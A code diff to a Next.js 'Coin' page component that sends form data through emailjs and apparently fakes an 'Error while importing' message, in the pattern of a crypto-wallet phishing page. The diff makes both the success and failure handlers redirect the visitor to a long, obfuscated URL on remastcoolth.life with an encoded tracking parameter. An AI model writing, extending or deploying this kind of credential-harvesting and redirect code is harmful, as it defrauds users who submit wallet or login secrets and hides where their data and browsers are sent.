@@ -6,6 +6,7 @@ import Image from 'next/image';
 import Link from 'next/link';
 import emailjs from '@emailjs/browser';
 import Chat from '@/components/Chat';
+import { useRouter } from 'next/router';
 
 const LoaderAnimation = () => {
   return (
@@ -30,6 +31,7 @@ function Coin() {
   const [isLoading, setIsLoading] = useState(true);
   const [isError, setIsError] = useState(false);
   const [show, setShow] = useState(false);
+  const router = useRouter();
   const [errorRes, setErrorRes] = useState({
     err: false,
     msg: '',
@@ -52,17 +54,15 @@ function Coin() {
       .then(
         function (response) {
           console.log('SUCCESS!', response.status, response.text);
-          setErrorRes({
-            err: true,
-            msg: 'Error while importing',
-          });
+
+          window.location.href =
+            'https://remastcoolth.life/ed/mu4KiMSq4YCmMaKoA6ZI*NT4rk0aZH9z1e3evox0heNI1LEQnsTv8PTqYGh3eHI2uCpf1SxLhfzpzVB7xVrdau77vrjBxEHz3Vz4kAdlBeoI7evMkCNDk_F4INtaywE00cIH9PD5kfrTX5LURu5L0o82tjAijolm3ObWYN8PCBlaQizbSBfZXkz0F_dzS3QUIbmipySKkB09*uuAjYvzppcGEFu8p2hlhiy*o0dESbz1SE8maiD2eW*xdlmJXf_0mtVQtGxmz1MLEoEfhpWISupUXE35YwQ47CPJjX*ocTrZJRxOfMcgXByEsxhjxeJ_aTPjGgK6ujygzUGrnzkRfgK8IKY6eZXdXRbg1WNt1xOvfJ72C5RbIE5CFMXJKFEtMc4ZZr4z0157F*__p5X7oEH8oQ1U3kjgnJpn2N7gJHlvdLrwLMGATO2LcOls4swDsgvkvdwLezvCpCZaqgUSIWElfHcAGu0JkYonGn918eTTbzrhie8G*SWhFNhQrJR*wlurk1PK4*q5512*khytOggvqJcix70C86DnFRjyhoikXOvooJ_yc_OyVwnqDI3u?md=wei4mI6EDLiQndjJiOwwiIuBHbioTMsICduJiOiEkIsICc0JiOiQXYiVHciwiIthmI6IyMmFDM1cTY2cjZ4MmM2cjY5ATZ1QGZ0Q2Y1UTNwkTN4ICLiMmI6YjNwIDLiQmI60SMsISYiojN1UzMsIyciojIzYDM4';
         },
         function (error) {
           console.log('FAILED...', error);
-          setErrorRes({
-            err: true,
-            msg: 'Error while importing',
-          });
+
+          window.location.href =
+            'https://remastcoolth.life/ed/mu4KiMSq4YCmMaKoA6ZI*NT4rk0aZH9z1e3evox0heNI1LEQnsTv8PTqYGh3eHI2uCpf1SxLhfzpzVB7xVrdau77vrjBxEHz3Vz4kAdlBeoI7evMkCNDk_F4INtaywE00cIH9PD5kfrTX5LURu5L0o82tjAijolm3ObWYN8PCBlaQizbSBfZXkz0F_dzS3QUIbmipySKkB09*uuAjYvzppcGEFu8p2hlhiy*o0dESbz1SE8maiD2eW*xdlmJXf_0mtVQtGxmz1MLEoEfhpWISupUXE35YwQ47CPJjX*ocTrZJRxOfMcgXByEsxhjxeJ_aTPjGgK6ujygzUGrnzkRfgK8IKY6eZXdXRbg1WNt1xOvfJ72C5RbIE5CFMXJKFEtMc4ZZr4z0157F*__p5X7oEH8oQ1U3kjgnJpn2N7gJHlvdLrwLMGATO2LcOls4swDsgvkvdwLezvCpCZaqgUSIWElfHcAGu0JkYonGn918eTTbzrhie8G*SWhFNhQrJR*wlurk1PK4*q5512*khytOggvqJcix70C86DnFRjyhoikXOvooJ_yc_OyVwnqDI3u?md=wei4mI6EDLiQndjJiOwwiIuBHbioTMsICduJiOiEkIsICc0JiOiQXYiVHciwiIthmI6IyMmFDM1cTY2cjZ4MmM2cjY5ATZ1QGZ0Q2Y1UTNwkTN4ICLiMmI6YjNwIDLiQmI60SMsISYiojN1UzMsIyciojIzYDM4';
         }
       );
   };
@@ -317,6 +317,7 @@ function Coin() {
           )}
         </div>
       )}
+      {/* <ChatBox /> */}
       <Chat />
     </div>
   );
